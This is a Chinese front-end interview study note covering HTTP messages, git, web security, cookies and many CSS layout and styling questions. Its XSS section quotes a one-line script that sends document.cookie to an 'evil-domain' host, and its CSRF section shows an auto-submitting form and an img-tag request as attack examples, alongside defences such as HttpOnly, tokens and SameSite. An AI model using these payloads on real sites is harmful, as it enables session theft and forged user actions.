Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
Referer: https://www.google.com.hk/
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: authorstyle=yes
If-None-Match: "2cc8-3e3073913b100"
If-Modified-Since: Wed, 01 Sep 2004 13:24:52 GMT
（3）空行 CRLF
（4）请求体：
name=qiu&age=25
```

### response报文结构

```text
（1）响应状态行：协议版本 状态码 状态描述 CRLF
HTTP/1.1 200 OK
（2）响应头：若干响应头，包括通用头部、响应头部、实体头部
Date: Tue, 08 Jul 2014 05:28:43 GMT
Server: Apache/2
Last-Modified: Wed, 01 Sep 2004 13:24:52 GMT
ETag: "40d7-3e3073913b100"
Accept-Ranges: bytes
Content-Length: 16599
Cache-Control: max-age=21600
Expires: Tue, 08 Jul 2014 11:28:43 GMT
P3P: policyref="http://www.w3.org/2001/05/P3P/p3p.xml"
Content-Type: text/html; charset=iso-8859-1
（3）空行 CRLF
（4）响应体：
{"name": "qiu", "age": 25}
```

## git fetch和git pull的区别

- `git pull`：相当于是从远程获取最新版本并`merge`到本地
- `git fetch`：相当于是从远程获取最新版本到本地，不会自动`merge`

## 常见web安全及防护原理

- `sql`注入原理
  - 就是通过把`SQL`命令插入到`Web`表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令
- 总的来说有以下几点
  - 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双`"-"`进行转换等
  - 永远不要使用动态拼装SQL，可以使用参数化的`SQL`或者直接使用存储过程进行数据查询存取
  - 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接
  - 不要把机密信息明文存放，请加密或者`hash`掉密码和敏感的信息

**XSS原理及防范**

- `Xss(cross-site scripting)`攻击指的是攻击者往`Web`页面里插入恶意`html`标签或者`javascript`代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取`cookie`中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点

**XSS防范方法**

- 首先代码里对用户输入的地方和变量都需要仔细检查长度和对`”<”,”>”,”;”,”’”`等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把`html tag` 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击

**XSS与CSRF有什么区别吗？**

- `XSS`是获取信息，不需要提前知道其他用户页面的代码和数据包。`CSRF`是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次`CSRF`攻击，受害者必须依次完成两个步骤
- 登录受信任网站`A`，并在本地生成`Cookie`
- 在不登出`A`的情况下，访问危险网站`B`

**CSRF的防御**

- 服务端的`CSRF`方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数
- 通过验证码的方法

## 用过哪些设计模式？

- 工厂模式：
  - 工厂模式解决了重复实例化的问题，但还有一个问题,那就是识别问题，因为根本无法
  - 主要好处就是可以消除对象间的耦合，通过使用工程方法而不是`new`关键字
- 构造函数模式
  - 使用构造函数的方法，即解决了重复实例化的问题，又解决了对象识别的问题，该模式与工厂模式的不同之处在于
  - 直接将属性和方法赋值给 `this`对象;

## 什么是cookie，有什么用

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上（*这意味着是会被保存在本地的*）。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于[无状态](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#http_is_stateless_but_not_sessionless)的 HTTP 协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）、

Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API) 。

| **参数**        | **描述**                                                     |
| --------------- | ------------------------------------------------------------ |
| Name            | cookie的名称，一旦创建，不可更改                             |
| Value           | cookie的值，若值为Unicode字符，需要为字符编码。若值为二进制数据，需要使用BASE64编码 |
| Domain          | 可以访问cookie的域名。如设置为。liu.com，以liu.com结尾的域名都可以访问这个cookie |
| Path            | cookie的使用路径，设置为/，则本禹铭下所有页面都可以访问这个cookie. |
| Expires/Max-Age | 有效时间                                                     |
| Size            | cookie的大小                                                 |
| HttpOnly        | 若此属性为true,则只会在HTTP头中有这个Cookie的信息，不能通过document.cookie来访问它 |
| Secure          | 指定cookie是否仅被使用安全协议传输，默认为false              |
| SameSite        | 用来限制第三方cookie,减少安全风险(防止CSRF攻击（CSRF攻击是：cookie存储用户的身份信息，恶意网站设法伪造带有正确cookie的HTTP请求）) |



###  创建cookie

当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

![img](https://pic4.zhimg.com/80/v2-b9637047c96bb6ac934807a820dc7663_720w.jpg)

### XSS攻击

#### 什么是XSS

会话劫持，在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 [XSS (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) 攻击。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

### CSRF攻击

#### 什么是CSRF

（Cross Site Request Forgery, 跨站域请求伪造）是一种网络的攻击方式，它在 2007 年曾被列为互联网 20 大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（[XSS](https://link.jianshu.com?t=http://baike.baidu.com/view/50325.htm)），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过`伪装来自受信任用户`的请求来利用受信任的网站。与[XSS](https://link.jianshu.com?t=http://baike.baidu.com/view/50325.htm)攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和`难以防范`，所以被认为比[XSS](https://link.jianshu.com?t=http://baike.baidu.com/view/50325.htm)`更具危险性`。

![img](https://pic1.zhimg.com/80/v2-05b0dd2744a82edca44ff41da4f68698_720w.jpg)

* GET类型

  * ```html
    <img src=http://wooyun.org/csrf?xx=11 /> 
    ```

  * 在访问含有这个img的页面后，成功向`http://wooyun.org/csrf?xx=11` 发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。

* POST类型

  * ```html
    <form action=http://wooyun.org/csrf.php method=POST>
    	<input type="text" name="xx" value="11" />
    </form>
    <script> document.forms[0].submit(); </script> 
    ```

  * 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。

### 防御CSRF

#### 1 验证HTTP Referer字段

根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，因此，要防御 CSRF 攻击，网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。

缺点：

* Referer由浏览器实现，这种方法是把安全性都依赖于第三方（即浏览器）来保障事实上；
  * 对于某些浏览器，比如`IE6 或 FF2`，目前已经有一些方法可以篡改 Referer 值。如果 网站支持`IE6 浏览器`，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。
* 即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。

#### 2 在请求地址中添加token并验证

CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中（真实的），因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。

这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 [http://url?csrftoken=tokenvalue](https://link.jianshu.com?t=http://url?csrftoken=tokenvalue)。 而对于 POST 请求来说，要在 form 的最后加上 <input type="hidden" name="csrftoken" value="tokenvalue"/>，这样就把 token 以参数的形式加入请求了。

要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

问题：对于网站中的各种请求，如何都添加上token

博客类网站，黑客发表了一个网址，如何保证跳转后的安全？

像知乎等会进行提示

#### 3 在HTTP头中自定义属性并验证

这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。
 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。

#### 4 设置SameSite

* SameSite=Strict：

严格模式，表明这个 cookie 在任何情况下都不可能作为第三方 cookie，绝无例外。比如说假如 b.com 设置了如下 cookie：

```
Set-Cookie: foo=1; SameSite=Strict
Set-Cookie: bar=2
```

你在 a.com 下发起的对 b.com 的任意请求中，foo 这个 cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 cookie 被设置成了 SameSite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 cookie，其它网站发起的对淘宝的任意请求都不会带上那个 cookie。

* SameSite=Lax：

宽松模式，比 Strict 放宽了点限制：假如这个请求是我上面总结的那种同步请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求（因为从语义上说 GET 是读取操作，比 POST 更安全），则这个 cookie 可以作为第三方 cookie。比如说假如 b.com 设置了如下 cookie：

```
Set-Cookie: foo=1; SameSite=Strict
Set-Cookie: bar=2; SameSite=Lax
Set-Cookie: baz=3
```

当用户从 a.com 点击链接进入 b.com 时，foo 这个 cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。

* 该用哪种模式？

该用哪种模式，要看你的需求。比如你的网站是一个少数人使用的后台管理系统，所有人的操作方式都是从自己浏览器的收藏夹里打开网址，那我看用 Strict 也无妨。如果你的网站是微博，用了 Strict 会这样：有人在某个论坛里发了帖子“快看这个微博多搞笑 http://weibo.com/111111/aaaaaa”，结果下面人都回复“打不开啊”；如果你的网站是淘宝，用了 Strict 会这样：某微商在微博上发了条消息“新百伦正品特卖5折起 https://item.taobao.com/item.htm?id=1111111”，结果点进去顾客买不了，也就是说，这种超多用户的、可能经常需要用户从别的网站点过来的网站，就不适合用 Strict 了。

假如你的网站有用 iframe 形式嵌在别的网站里的需求，那么连 Lax 你也不能用，因为 iframe 请求也是一种异步请求。或者假如别的网站有使用你的网站的 JSONP 接口，那么同样 Lax 你也不能用，比如天猫就是通过淘宝的 JSONP 接口来判断用户是否登录的。

有时安全性和灵活性就是矛盾的，需要取舍。

## JSONP

[jsonp跨域请求详解](https://zhuanlan.zhihu.com/p/24390509)



# CSS部分

## 1 css sprite

* 精灵图，将多个小图片拼到一个大图中，通过`background-position`和元素尺寸调节显示想要的背景图
* 优点：
  * 减少HTTP请求次数，极大提高页面加载速度
  * 增加图片信息重复度，提高压缩比，减少图片大小
  * 网页整体更换风格方便，只要更改少量图片即可
* 缺点：
  * 图片合并麻烦
  * 维护麻烦，修改一个图片可能要重新布局整个图片样式

## 2 `display:none`和`visibility: hidden`的区别

* `display:none`：
  * 让元素从渲染树中消失，渲染时不占用任何空间
  * 非继承属性，子节点是因为父元素从渲染树中消失了，所以也就消失了，修改子节点的属性也没用
  * 修改常规流中的`display`通产会造成文档重排
  * 读屏器不会读取`display:none`的元素内容
* `visibility: hidden`：
  * 仍在渲染树中，占据空间，只是内容不可见
  * 继承属性，子孙节点因为继承了`visibility: hidden`因此消失，更改属性可以显示出来
  * 修改`visibility`只会使本元素重绘
  * 读屏器会读取`visibility: hidden`的元素内容

## 3 `<link>`和`@import`的区别

* `<link>`：
  * `HTML`方式
  * 最大限度支持并行下载
  * 可以通过`rel="alternate stylesheet"`指定候选样式
  * 浏览器支持更好
* `@import`：
  * `CSS`方式
  * 过多嵌套导致串行下载，出现`FOUC`（文档样式短暂失效）
  * 必须在样式规则之前，可以在css文件中引用其他文件

## 4 什么是FOUC

* `Flash of Unstyled Content`：在用户定义的样式表文件加载之前使用默认样式，加载用户样式后，造成页面闪烁
* **解决**：把样式表文件放到文档的`<head>`

## 5 如何创建BFC（block formatting context，块级格式化上下文），有什么用

* 定义：形成一个独立的渲染区域，让处于BFC内部的元素与外部的元素相互隔离，使内外元素的定位不会相互影响
* **触发条件**（任意一条）：
  * 浮动元素----`float`的值不为`none`
  * 块级元素----`display`的值为`table-cell`，`table-caption`或`inline-block`
  * `overflow`的值不为`visible`
  * 绝对定位元素---`position`的值`ablsolute`或`fixed`
  * `flex`元素
  * `IE`中，`Layout`，可通过`zoom: 1`触发
* 与普通文档流的**区别**：
  * 普通文档流：
    * 浮动的元素不会被父级计算高度
    * 非浮动元素会覆盖浮动元素的位置
    * `margin`会传递给父级元素
    * 两个相邻元素的上下`margin`会重叠
  * BFC布局规则：
    * 浮动的元素会被父级计算高度（父级元素触发了`BFC`）
    * 非浮动元素不会覆盖浮动元素的位置（非浮动元素触发了`BFC`）
    * 为防止A、B的margin重叠给A添加一个包裹器wrap，让wrap触发BFC，从而让A\B的margin同时起作用
      * `margin`不会传递给父级（父级触发`BFC`）
      * 属于同一个`BFC`的两个相邻元素上下`margin`会重叠
      * 两个BFC之间的margin也会重叠
* 开发中的**应用**：
  * 阻止`margin`重叠
  * 可以包含浮动元素 —— 清除内部浮动(清除浮动的原理是两个 `div`都位于同一个 `BFC` 区域之中)
  * 自适应两栏布局
  * 可以阻止元素被浮动元素覆盖

## 6 display、float、position的关系

- 如果`display`取值为`none`，那么`position`和`float`都不起作用，这种情况下元素不产生框
- 否则，如果`position`取值为`absolute`或者`fixed`，框就是绝对定位的，`float`的计算值为`none`，`display`根据下面的表格进行调整。
- 否则，如果`float`不是`none`，框是浮动的，`display`根据下表进行调整
- 否则，如果元素是根元素，`display`根据下表进行调整
- 其他情况下`display`的值为指定值
- 总结起来：**绝对定位、浮动、根元素都需要调整`display`**

## 7 给行内元素设置padding和margin是否生效？

* 块级元素的padding和margin值的设置都是有效的。
* 行内元素的margin-left和margin-right是有效的，margin-top和margin-bottom并没有起作用。
* padding类似，但要注意padding-top/bottom会使得该元素的上下范围变大，但只是表象（实际没有作用），对周围的元素无影响。

## 8 为什么要初始化CSS样式?

- 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对`CSS`初始化往往会出现浏览器之间的页面显示差异。
- 当然，初始化样式会对`SEO`有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化

## 9 css3有哪些新特性

- 新增选择器 `p:nth-child(n) {color: rgba(255, 0, 0, 0.75)}`
- 弹性盒模型 `display: flex;`
- 多列布局 `column-count: 5;`
- 媒体查询 `@media (max-width: 480px) {.box: {column-count: 1;}}`
- 个性化字体 `@font-face{font-family: BorderWeb; src:url(BORDERW0.eot);}`
- 颜色透明度 `color: rgba(255, 0, 0, 0.75);`
- 圆角 `border-radius: 5px;`
- 渐变 `background:linear-gradient(red, green, blue);`
- 阴影 `box-shadow:3px 3px 3px rgba(0, 64, 128, 0.3);`
- 倒影 `box-reflect: below 2px;`
- 文字装饰 `text-stroke-color: red;`
- 文字溢出 `text-overflow:ellipsis;`
- 背景效果 `background-size: 100px 100px;`
- 边框效果 `border-image:url(bt_blue.png) 0 10;`
- 转换
  - 旋转 `transform: rotate(20deg);`
  - 倾斜 `transform: skew(150deg, -10deg);`
  - 位移 `transform: translate(20px, 20px);`
  - 缩放 `transform: scale(.5);`
- 平滑过渡 `transition: all .3s ease-in .1s;`
- 动画 `@keyframes anim-1 {50% {border-radius: 50%;}} animation: anim-1 1s;`

**CSS3新增伪类（ : ）有那些？**

- `p:first-of-type` 选择属于其父元素的首个`<p>`元素的每个`<p>` 元素。
- `p:last-of-type` 选择属于其父元素的最后 `<p>` 元素的每个`<p>` 元素。
- `p:only-of-type` 选择属于其父元素唯一的 `<p>`元素的每个 `<p>` 元素。
- `p:only-child` 选择属于其父元素的唯一子元素的每个 `<p>` 元素。
- `p:nth-child(2)` 选择属于其父元素的第二个子元素的每个 `<p>` 元素。
- `:after` 在元素之前添加内容,也可以用来做清除浮动。
- `:before` 在元素之后添加内容。
- `:enabled` 已启用的表单元素。
- `:disabled` 已禁用的表单元素。
- `:checked` 单选框或复选框被选中。

## 10 display有哪些值？说明他们的作用

- `block` 转换成块状元素。
- `inline` 转换成行内元素。
- `none` 设置元素不可见。
- `inline-block` 象行内元素一样显示，但其内容象块类型元素一样显示。
- `list-item` 象块类型元素一样显示，并添加样式列表标记。
- `table` 此元素会作为块级表格来显示
- `inherit` 规定应该从父元素继承 `display` 属性的值

## 11 盒子模型

* 构成：内容`content`，内边距`padding`，边框`border`，外边距`margin`
* 种类：
  * 标准（W3C）盒模型
    * 元素实际占据宽度`= width + padding + border +margin `
    * 通过设置`box-sizing: content-box`触发
  * 怪异（IE）盒模型
    * 元素实际占据宽度`= width + margin`
    * 通过设置`box-sizing: border-box`触发
  * 设置通过设置`box-sizing: inherit`继承父元素的`box-sizing`设置

## 12 CSS权重如何计算

* `！important > id(## | 100) > class( . | 10) > tag(标签 | 1)`
* 同样的权重，就近
* 内联样式 > 内部样式 > 外部样式
* `!important` > 内联样式

## 13 谈谈浮动、清除浮动

* 浮动：

  * 浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上
  * 浮动元素会脱离文档流(绝对定位元素也会脱离文档流)，导致无法计算准确的高度，这种问题称为**高度塌陷**。解决高度塌陷问题的前提是能够识别并包含浮动元素，也就是**清除浮动**。

* 清除浮动：

  * （不推荐）额外标签法：最后一个浮动标签后，新加一个标签，给其设置属性`clear:both;`

    * 通俗易懂，但语义化差

  * （不推荐）父级元素添加属性`overflow: hidden`，触发BFC

    * 简洁，但内容增多若为自动换行，会有内容被隐藏，无法显示要溢出的元素

  * <span style="color: red;">（推荐）</span>使用`after`伪元素清除，把`clearfix`添加给父级元素

    * ```css
      .clearfix {
      	*zoom: 1; /* ie6清除浮动的方式，*表示只有ie6执行，触发hasLayout */
      }
      .clearfix:after {
          content: '';
          display: block;
          height: 0;
          clear: both;
          visibility: hidden;
      }
      ```

  * <span style="color: red;">（推荐）</span>使用`before`和`after`双伪元素清除

    * ```css
      .clearfix:after,.clearfix:before{
          content: "";
          display: table;
      }
      .clearfix:after{
          clear: both;
      }
      .clearfix{
          *zoom: 1;
      }
      ```

      

## 14 `position`不同值的定位原点

* `position: releactive`：相对定位，相对于其正常所处位置进行定位
* `position: absolute`：绝对定位，相对于最近的具有定位的父元素进行定位，没有则相对于浏览器窗口
  * 脱离文档流，触发BFC
* `position: fixed`：固定定位，相对于浏览器窗口进行定位
  * 脱离文档流，触发BFC
* `position: static`：默认值，无定位，正常处于数据流中
* `position: inherit`：继承父元素的设置

## 15 `display: inline-block`中间间隙

* 原因：`inline-block`元素间有空格或是换行，因此产生了间隙

* 如何消除：

  * 去除元素之间的空格或者换行，但会比较难看

  * 空格符本质上就是个字符，设置`font-size: 0`，但在`chrome`下无效，在`IE6\7`残留1px间隙

  * `letter-spacing`字符边距属性可以控制文字间的水平距离的，支持负值，可以让文字水平方向上重叠，但Opera支持不好

  * ```css
    .box {
        font-size: 0;
        letter-spacing: -3px;
    }
    ```

  * `margin-left`

  * 添加浮动，但还需要清除浮动的操作

## 16 `PNG\GIF\JPEG`有什么区别？如何选择

* `PNG`
  * 有`PNG8`和`truecolor PNG`
  * `PNG8`类似`GIF`颜色上限为`256`，文件小，支持`alpha`透明度，无动画
  * 适合图标、背景、按钮
* `GIF`
  * `8`位像素，`256`色
  * 无损压缩
  * 支持简单动画
  * 支持`boolean`透明
  * 适合简单动画
* `JPEG`
  * 颜色限于`256`
  * 有损压缩
  * 可控制压缩质量
  * 不支持透明
  * 适合照片

## 17 行内元素`float:left`之后会变成块级元素吗

* 不会，更偏向于`inline-block`，最明显的区别是`width`不会默认占满一行

## 18 网页字体大小应该设置为奇数还是偶数？

* 偶数，更方便和其它元素构成比例关系

## 19 手写动画最小时间间隔

* 浏览器默认的`60Hz`刷新频率，因此最小为`1/60 * 1000ms = 16.7ms`

## 20 CSS合并方法

* 避免使用`@import`引入多个`css`文件，可以使用`CSS`工具将`CSS`合并为一个`CSS`文件，例如使用`Sass\Compass`等

## 21 列出你所知道可以改变页面布局的属性

- `position`、`display`、`float`、`width`、`height`、`margin`、`padding`、`top`、`left`、`right`

## 22  CSS3动画（简单动画的实现，如旋转等）

- 依靠`CSS3`中提出的三个属性：`transition`、`transform`、`animation`
- `transition`：定义了元素在变化过程中是怎么样的，包含`transition-property`、`transition-duration`、`transition-timing-function`、`transition-delay`。
- `transform`：定义元素的变化结果，包含`rotate`、`scale`、`skew`、`translate`。
- `animation`：动画定义了动作的每一帧（`@keyframes`）有什么效果，包括`animation-name`，`animation-duration`、`animation-timing-function`、`animation-delay`、`animation-iteration-count`、`animation-direction`

## 23 几种常见的CSS布局

* 流体布局

```html
<div class="container">
    <div class="left"></div>
    <div class="right"></div>
    <div class="main"></div>
</div>
```

```css
.left {
    float: left;
    width: 100px;
    height: 200px;
    background: red;
}
.right {
    float: right;
    width: 200px;
    height: 200px;
    background: blue;
}
.main {
    margin-left: 120px;
    margin-right: 220px;
    height: 200px;
    background: green;
}
```

* 圣杯布局
  * 要求：三列布局；中间主体内容前置，且宽度自适应；两边内容定宽
    - 好处：重要的内容放在文档流前面可以优先渲染
    - 原理：利用相对定位、浮动、盒子内边距、**负外边距**布局，而不添加额外标签

```html
<div class="container">
	<div class="main">1</div>
	<div class="left">2</div>
	<div class="right">3</div>
</div>
```

```css
  .container {
      padding-left: 150px;
      padding-right: 190px;
      hight: 100px;
  }
  .main {
      float: left;
      width: 100%;
      background: green;
  }
  .left {
      float: left;
      width: 150px;
      margin-left: -100%;
      position: relative;
      left: -150px;
      background: red;
  }
  .right {
      float: left;
      width: 190px;
      margin-left: -190px;
      position: relative;
      right: -190px;
      background: blue;
  }
```

* 双飞翼布局
  - 双飞翼布局：对圣杯布局（使用相对定位，对以后布局有局限性）的改进，消除相对定位布局
  - 原理：主体元素上设置左右边距，预留两翼位置。左右两栏使用浮动和负边距归位，消除相对定位。

```html
<!-- 注意布局的特殊之处 -->
<div class="content">
    <div class="main"></div>
</div>
<div class="left"></div>
<div class="right"></div>
```

```css
.content {
    width: 100%;
    float: left;   /* 浮动 */
}
.main {
    margin-left: 150px;
    margin-right: 190px;
}
.left {
    float: left;  /* 浮动 */
    width: 150px;
    margin-left: -100%;    /* 本来是向左移动整个window的距离，因为邻接的上一个盒子有浮动，因此移动了上一个盒子的宽度，跑到了最右侧 */
}
.right {
    float: left;  /* 浮动 */
    width: 190px;
    margin-left: -190px;
}
```

## 24 stylus/sass/less区别

- 均具有“变量”、“混合”、“嵌套”、“继承”、“颜色混合”五大基本特性
- `Scss`和`LESS`语法较为严谨，`LESS`要求一定要使用大括号“{}”，`Scss`和`Stylus`可以通过缩进表示层次与嵌套关系
- `Scss`无全局变量的概念，`LESS`和`Stylus`有类似于其它语言的作用域概念
- `Sass`是基于`Ruby`语言的，而`LESS`和`Stylus`可以基于`NodeJS` `NPM`下载相应库后进行编译；

## 25 如何美化`checkbox`

- `<label>` 属性 `for` 和 `id`
- 隐藏原生的 `<input>`
- `:checked + <label>`

## 26 自适应布局

思路：

- 左侧浮动或者绝对定位，然后右侧`margin`撑开
- 使用`<div>`包含，然后靠负`margin`形成`bfc`
- 使用`flex`

## 27 什么是外边距重叠？重叠的结果是什么？

> 外边距重叠就是margin-collapse

- 在CSS当中，相邻的两个盒子（可能是兄弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距。这种合并外边距的方式被称为折叠，并且因而所结合成的外边距称为折叠外边距。
- 只有垂直的会折叠

* **折叠结果遵循下列计算规则**：
  * 两个相邻的外边距都是正数时，折叠结果是它们两者之间较大的值。
  * 两个相邻的外边距都是负数时，折叠结果是两者绝对值的较大值。
  * 两个外边距一正一负时，折叠结果是两者的相加的和。
* **如何避免？**
  * https://blog.csdn.net/m0_48721669/article/details/121156239?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-9.opensearchhbase&spm=1001.2101.3001.4242.6
  * **2.**创建了块级格式化上下文的元素，不和它的子元素发生 margin 折叠**（注意这里指的是创建了BFC的元素和它的子元素不会发生折叠）**

## 28 opacity和rgba、transparent的透明效果有什么不同？

- 都能实现透明效果
- `opacity`
  - 作为一个完整属性出现的
  - 对于整个元素起作用的
- `rgba`和`transparent`
  - 作为属性值出现的
  - 任何需要设置颜色的地方都可以根据情况使用`transparent`或`rgba`。比如背景、边框、字体等等。
    - 哪个属性的颜色设置了transparent，哪个属性就是透明的，完全透明。
    - 哪个属性用rgba()设置了透明，就对哪个属性起作用，透明程度可设置，从 0.0 （完全透明）到 1.0（完全不透明）。
- 由于`opacity`和`alpha`设置的透明程度可调，就引出一个继承的问题。如果一个元素未设置opacity属性，那么它会从它的父元素继承opacity属性的值。而alpha不存在继承。

## 29 css中可以让文字在垂直和水平方向上重叠的两个属性是什么？

- 垂直方向：`line-height`
- 水平方向：`letter-spacing` 这是设置文字间隙

重叠是什么意思？？

## 30 **如何垂直居中一个`<img>`**

```css
##container     /**<img>的容器设置如下**/
{
    display:table-cell;
    text-align:center;
    vertical-align:middle;
}
```

在MDN上img是可替换元素，也是一种行内块元素

## 31 css各种单位

- `px`和`em`都是长度单位，区别是，`px`的值是固定的，指定是多少就是多少，计算比较容易。`em`得值不是固定的，并且`em`会继承父级元素的字体大小。
- 浏览器的默认字体高都是`16px`。所以未经调整的浏览器都符合: `1em=16px`。那么`12px=0.75em`, `10px=0.625em`。

> - px 相对于显示器屏幕分辨率，无法用浏览器字体放大功能
> - em 值并不是固定的，会继承父级的字体大小： em = 像素值 / 父级font-size

## 32 水平居中的方法

- 元素为行内元素，设置父元素`text-align:center`
- 如果元素宽度固定，可以设置左右`margin`为`auto`;
- 绝对定位和移动: `absolute + transform`
- 使用`flex-box`布局，指定`justify-content`属性为center
- `display`设置为`tabel-ceil`

## 33 垂直居中的方法

- 将显示方式设置为表格，`display:table-cell`,同时设置`vertial-align：middle`
- 使用`flex`布局，设置为`align-item：center`
- 绝对定位中设置`bottom:0,top:0`,并设置`margin:auto`
- 绝对定位中固定高度时设置`top:50%，margin-top`值为高度一半的负值
- 文本垂直居中设置`line-height`为`height`值, 如果是单行文本, line-height 设置成和 height 值

```css
.vertical {
    height: 100px;
    line-height: 100px;
  }
```

- 已知高度的块级子元素，采用绝对定位和负边距

```css
.container {
  position: relative;
}
.vertical {
  height: 300px;  /*子元素高度*/
  position: absolute;
  top:50%;  /*父元素高度50%*/
  margin-top: -150px; /*自身高度一半*/
}
```

